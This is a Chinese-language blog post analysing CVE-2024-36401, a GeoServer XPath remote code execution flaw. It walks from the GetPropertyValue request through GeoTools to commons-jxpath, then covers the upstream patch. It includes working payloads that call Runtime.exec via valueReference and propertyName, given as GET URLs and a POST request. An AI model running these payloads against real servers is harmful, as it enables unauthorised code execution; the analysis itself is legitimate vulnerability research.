<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CVE-2024-36401 GeoServer XPath rce | Tree's Blog</title><meta name="author" content="Tree"><meta name="copyright" content="Tree"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CVE-2024-36401 GeoServer XPath rce前言GeoServer是一个用Java编写的开源软件服务器，允许用户共享和编辑地理空间数据。它为提供交互操作性而设计，使用开放标准发布来自任何主要空间数据源的数据。 漏洞描述该系统不安全地将属性名称解析为 XPath 表达式。GeoServer 调用的 GeoTools 库 API 以不安全的方式将要素类型的属性名称传递给 com">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2024-36401 GeoServer XPath rce">
<meta property="og:url" content="http://example.com/2024/07/03/CVE-2024-36401-GeoServer-XPath-rce/index.html">
<meta property="og:site_name" content="Tree&#39;s Blog">
<meta property="og:description" content="CVE-2024-36401 GeoServer XPath rce前言GeoServer是一个用Java编写的开源软件服务器，允许用户共享和编辑地理空间数据。它为提供交互操作性而设计，使用开放标准发布来自任何主要空间数据源的数据。 漏洞描述该系统不安全地将属性名称解析为 XPath 表达式。GeoServer 调用的 GeoTools 库 API 以不安全的方式将要素类型的属性名称传递给 com">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/todis21/image/main/202304031628382.png">
<meta property="article:published_time" content="2024-07-03T03:41:52.000Z">
<meta property="article:modified_time" content="2024-07-09T02:56:53.267Z">
<meta property="article:author" content="Tree">
<meta property="article:tag" content="Java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/todis21/image/main/202304031628382.png"><link rel="shortcut icon" href="/img/favicon.jfif"><link rel="canonical" href="http://example.com/2024/07/03/CVE-2024-36401-GeoServer-XPath-rce/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CVE-2024-36401 GeoServer XPath rce',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-09 10:56:53'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/bg.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jfif" onerror="onerror=null;src='/img/404.png'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">69</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/todis21/image/main/202304031628382.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Tree's Blog"><span class="site-name">Tree's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CVE-2024-36401 GeoServer XPath rce</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-03T03:41:52.000Z" title="发表于 2024-07-03 11:41:52">2024-07-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-09T02:56:53.267Z" title="更新于 2024-07-09 10:56:53">2024-07-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CVE-2024-36401 GeoServer XPath rce"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="CVE-2024-36401-GeoServer-XPath-rce"><a href="#CVE-2024-36401-GeoServer-XPath-rce" class="headerlink" title="CVE-2024-36401 GeoServer XPath rce"></a>CVE-2024-36401 GeoServer XPath rce</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>GeoServer是一个用Java编写的开源软件服务器，允许用户共享和编辑地理空间数据。它为提供交互操作性而设计，使用开放标准发布来自任何主要空间数据源的数据。</p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>该系统不安全地将属性名称解析为 XPath 表达式。GeoServer 调用的 GeoTools 库 API 以不安全的方式将要素类型的属性名称传递给 commons-jxpath 库。该库在解析 XPath 表达式时，可以执行任意代码。影响范围：<code>GeoServer &lt; 2.23.6 </code>   <code>2.24.0 &lt;= GeoServer &lt; 2.24.4</code>     <code>2.25.0 &lt;= GeoServer &lt; 2.25.2</code></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>代码可以直接去github下载，自己编译运行：<a target="_blank" rel="noopener" href="https://github.com/geoserver/geoserver/">https://github.com/geoserver/geoserver/</a></p>
<p>或在Vulhub下载对应的docker-compose.yml </p>
<pre><code class="yml">version: &#39;3&#39;
services:
 web:
   image: vulhub/geoserver:2.23.2
   ports:
    - &quot;8080:8080&quot;
    - &quot;5005:5005&quot;
</code></pre>
<p>建议用Vulhub的环境，方便快捷</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>当我写这篇文章时，该漏洞的复现文章和POC已经传遍全网，在此简单的复现没有什么意义，不如分析一下，知其来龙去脉，岂不妙哉</p>
<p>首先分析官方通告：<a target="_blank" rel="noopener" href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv</a></p>
<p>主要看这两段话：</p>
<pre><code>Details
The GeoTools library API that GeoServer calls evaluates property/attribute names for feature types in a way that unsafely passes them to the commons-jxpath library which can execute arbitrary code when evaluating XPath expressions. This XPath evaluation is intended to be used only by complex feature types (i.e., Application Schema data stores) but is incorrectly being applied to simple feature types as well which makes this vulnerability apply to ALL GeoServer instances.

PoC
No public PoC is provided but this vulnerability has been confirmed to be exploitable through WFS GetFeature, WFS GetPropertyValue, WMS GetMap, WMS GetFeatureInfo, WMS GetLegendGraphic and WPS Execute requests.
</code></pre>
<p>对应翻译：</p>
<pre><code>详情
GeoServer调用的GeoTools库API在评估要素类型的特征/属性名称时，以一种不安全的方式传递给commons-jxpath库，该库在评估XPath表达式时可以执行任意代码。这种XPath评估本意仅用于复杂要素类型（即，应用程序模式数据存储），但错误地也被应用于简单要素类型，这使得这个漏洞适用于所有GeoServer实例。

PoC
没有提供公开的PoC，但这个漏洞已被确认可以通过WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic和WPS Execute请求来利用。
</code></pre>
<p>总的来说是<code>GeoTools库</code>的问题，这个库用的xpath引擎是Apache Commons Jxpath,参考<a target="_blank" rel="noopener" href="https://tttang.com/archive/1771/">CVE-2022-41852</a> ,</p>
<p>再看GeoTools的漏洞通告：<a target="_blank" rel="noopener" href="https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w">https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w</a></p>
<pre><code class="java">以下方法将 XPath 表达式传递给commons-jxpath库，该库可以执行任意代码，如果 XPath 表达式由用户输入提供，则会造成安全问题。
org.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)
org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)
org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)
org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class&lt;T&gt;)
org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)
org.geotools.data.complex.expression.MapPropertyAccessorFactory.new PropertyAccessor() &#123;...&#125;.get(Object, String, Class&lt;T&gt;)
org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String)
</code></pre>
<p>在此，我们相当于得到了Sinks , 而source在GeoServer的漏洞通告的POC已经提示了几个接口<code>WFS GetFeature</code>、<code>WFS GetPropertyValue</code>、<code>WMS GetMap</code>、<code>WMS GetFeatureInfo</code>、<code>WMS GetLegendGraphic</code>和<code>WPS Execute</code></p>
<h3 id="GetPropertyValue"><a href="#GetPropertyValue" class="headerlink" title="GetPropertyValue"></a>GetPropertyValue</h3><p>去官方找这几个接口的<a target="_blank" rel="noopener" href="https://github.com/geoserver/geoserver/blob/2.23.2/doc/en/user/source/services/wfs/reference.rst">用例</a>，以网传使用的<code>WFS GetPropertyValue</code>接口为例，</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2024/image-20240703172048501.png" alt="image-20240703172048501"></p>
<p>如图所示，<code>GetPropertyValue</code>的作用是从查询所标识的给定要素集的数据源中检索要素属性的值或复杂要素属性值的部分，其中<code>valueReference</code>是要检索不同属性的值，猜测这里是注入的地方，注意的是typeName的值必须是存在的类型，不能乱填</p>
<p>在上面提到的sinks下断点，输入url查看停到哪个断点上</p>
<pre><code>http://192.168.79.147:8080/geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=ssssss
</code></pre>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2024/image-20240703173435323.png" alt="image-20240703173435323"></p>
<p>发现断点在<code>org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get()</code>方法上，此时的xpath参数的值正是<code>valueReference</code>的值，说明这里是注入点</p>
<p>根据调用栈，往前看，从<code>org.geoserver.wfs.GetPropertyValue</code>的run方法开始</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2024/image-20240703174400531.png" alt="image-20240703174400531"></p>
<p>run方法获取请求对象，然后就是各种解析，其中发现这里会把valueReference的值进行一个正则匹配，将[]中的内容和[]替换为空</p>
<p>跟进evaluate()方法查看</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2024/image-20240703175841396.png" alt="image-20240703175841396"></p>
<p>继续跟进</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2024/image-20240703180031295.png" alt="image-20240703180031295"></p>
<p>在这个evaluate()方法里，调用了一个get方法，accessor是FeaturePropertyAccessor的实例。如果分析漏洞是时候是搜索所有FeaturePropertyAccessor的引用，根本没办法搜到，CodeQL这类静态分析工具来分析漏洞时就可能会错过</p>
<p>回到get方法</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2024/image-20240703180644333.png" alt="image-20240703180644333"></p>
<p>这里先获取context，然后调用<code>iteratePointers</code>方法，</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2024/image-20240703205401744.png" alt="image-20240703205401744"></p>
<p>跟进<code>this.compileExpression</code></p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2024/image-20240703205511833.png" alt="image-20240703205511833"></p>
<p>对传入的xpath进行编译,如果前面编译过了，这里直接返回</p>
<p>往下就来到了<code>org.apache.commons.jxpath.ri.compiler.Expression</code>这个类的<code>iteratePointers</code>方法</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2024/image-20240703210552154.png" alt="image-20240703210552154"></p>
<p> 这个会根据刚刚编译返回的对象，跳转到对应的compute方法</p>
<p>因为传入的<code>valueReference=sssss</code>,会跳转到<code>org.apache.commons.jxpath.ri.compiler.LocationPath</code>的compute方法</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2024/image-20240703212038558.png" alt="image-20240703212038558"></p>
<p>如果传入的<code>valueReference=exec(java.lang.Runtime.getRuntime(),&#39;touch /tmp/pwn&#39;)</code>    （payload来源为<a target="_blank" rel="noopener" href="https://tttang.com/archive/1771/%EF%BC%89">https://tttang.com/archive/1771/）</a></p>
<p>则跳转到<code>org.apache.commons.jxpath.ri.compiler.ExtensionFunction的compute</code></p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2024/image-20240703211445191.png" alt="image-20240703211445191"></p>
<p>继续跟进，来到computeValue</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2024/image-20240703211554584.png" alt="image-20240703211554584"></p>
<p>这里获得了org.apache.commons.jxpath.Function对应的这个实例后，回去调用具体的invoke的实现</p>
<p>运行结果</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2024/image-20240703212252759.png" alt="image-20240703212252759"></p>
<p>根据官网教程，还可以使用POST请求</p>
<pre><code class="http">POST /geoserver/wfs HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0 ldwk
Accept: */*Accept-Language: en-US,en;q=0.5Content-Length: 329

&lt;wfs:GetPropertyValue service=&#39;WFS&#39; version=&#39;2.0.0&#39;xmlns:topp=&#39;http://www.openplans.org/topp&#39;xmlns:fes=&#39;http://www.opengis.net/fes/2.0&#39;xmlns:wfs=&#39;http://www.opengis.net/wfs/2.0&#39;valueReference=&#39;exec(java.lang.Runtime.getRuntime(),&quot;touch /tmp/pwn&quot;)&#39;&gt;&lt;wfs:Query typeNames=&#39;topp:states&#39;/&gt;
&lt;/wfs:GetPropertyValue&gt;
</code></pre>
<h3 id="GetFeature"><a href="#GetFeature" class="headerlink" title="GetFeature"></a>GetFeature</h3><p>同理进行测试，得到传入的参数是<code>propertyName</code></p>
<pre><code class="url">http://192.168.79.147:8080/geoserver/wfs?service=wfs&amp;version=2.0.0&amp;request=GetFeature&amp;typeNames=topp:states&amp;featureID=feature&amp;propertyName=exec(java.lang.Runtime.getRuntime(),&#39;touch%20/tmp/pwn2&#39;)
</code></pre>
<p>经过调试发现，payload被逗号分割，传入的xpath变成了<code>exec(java.lang.Runtime.getRuntime()</code>，需要换个payload</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>GeoServer官方给出的修复方案是更新最新版或者下载补丁包括已修复的 gt-app-schema、gt-complex 和 gt-xsd-core jar 文件，似乎只是更新了geotools的依赖</p>
<p>而geotools官方给出的修复是修改对XPath 表达式的处理：<a target="_blank" rel="noopener" href="https://github.com/geotools/geotools/commit/fa187593abd5784d4338e7b5fff97eb47ce60b78">https://github.com/geotools/geotools/commit/fa187593abd5784d4338e7b5fff97eb47ce60b78</a></p>
<p>前面提到的Sinks添加了安全检查<code>newSafeContext</code>,例如FeaturePropertyAccessorFactory类的get方法</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2024/image-20240704104109653.png" alt="image-20240704104109653"></p>
<p> org.geotools.xsd.impl.jxpath.JXPathUtils是新添加的一个类，禁止通过 XPath 表达式调用 Java 方法</p>
<p><img src="https://raw.githubusercontent.com/todis21/image/main/2024/image-20240704104502829.png" alt="image-20240704104502829"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1771/">https://tttang.com/archive/1771/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/geoserver/geoserver/blob/2.23.2/doc/en/user/source/services/wfs/reference.rst">https://github.com/geoserver/geoserver/blob/2.23.2/doc/en/user/source/services/wfs/reference.rst</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w">https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Tree</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/07/03/CVE-2024-36401-GeoServer-XPath-rce/">http://example.com/2024/07/03/CVE-2024-36401-GeoServer-XPath-rce/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Tree's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/">Java</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/todis21/image/main/202304031628382.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/05/CVE-2024-31982-XWiki-DatabaseSearch-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="CVE-2024-31982 XWiki DatabaseSearch 远程代码执行漏洞"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2024/wallhaven-yxo2eg_1920x1080.png" onerror="onerror=null;src='/img/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CVE-2024-31982 XWiki DatabaseSearch 远程代码执行漏洞</div></div></a></div><div class="next-post pull-right"><a href="/2024/06/26/Apache-Kafka-UI-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Apache Kafka UI 远程代码执行漏洞分析"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2024/wallhaven-x6gyyv_2560x1440.png" onerror="onerror=null;src='/img/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Apache Kafka UI 远程代码执行漏洞分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/07/15/7%E6%9C%8815%E6%97%A5%E7%BD%91%E4%BC%A0%E7%9A%84nacos-0day/" title="网传的nacos 0day"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2024/wallhaven-5govy1_1920x1080.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-15</div><div class="title">网传的nacos 0day</div></div></a></div><div><a href="/2024/06/26/Apache-Kafka-UI-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Apache Kafka UI 远程代码执行漏洞分析"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2024/wallhaven-x6gyyv_2560x1440.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-26</div><div class="title">Apache Kafka UI 远程代码执行漏洞分析</div></div></a></div><div><a href="/2023/09/15/C3P0/" title="C3P0"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230915162829811.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-15</div><div class="title">C3P0</div></div></a></div><div><a href="/2024/03/26/CVE-2024-23328%E5%88%86%E6%9E%90/" title="CVE-2024-23328分析"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2024/wallhaven-kx62e1_1920x1080.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-26</div><div class="title">CVE-2024-23328分析</div></div></a></div><div><a href="/2024/07/05/CVE-2024-31982-XWiki-DatabaseSearch-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="CVE-2024-31982 XWiki DatabaseSearch 远程代码执行漏洞"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/2024/wallhaven-yxo2eg_1920x1080.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-05</div><div class="title">CVE-2024-31982 XWiki DatabaseSearch 远程代码执行漏洞</div></div></a></div><div><a href="/2023/04/04/CommonCollections1/" title="CommonCollections1"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/202304051554165.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-04</div><div class="title">CommonCollections1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jfif" onerror="this.onerror=null;this.src='/img/404.png'" alt="avatar"/></div><div class="author-info__name">Tree</div><div class="author-info__description">随便都行都可以</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">69</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/todis21"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/todis21" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3440848736@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2024-36401-GeoServer-XPath-rce"><span class="toc-number">1.</span> <span class="toc-text">CVE-2024-36401 GeoServer XPath rce</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.3.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GetPropertyValue"><span class="toc-number">1.4.1.</span> <span class="toc-text">GetPropertyValue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetFeature"><span class="toc-number">1.4.2.</span> <span class="toc-text">GetFeature</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.5.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.6.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/07/15/7%E6%9C%8815%E6%97%A5%E7%BD%91%E4%BC%A0%E7%9A%84nacos-0day/" title="网传的nacos 0day"><img src="https://raw.githubusercontent.com/todis21/image/main/2024/wallhaven-5govy1_1920x1080.png" 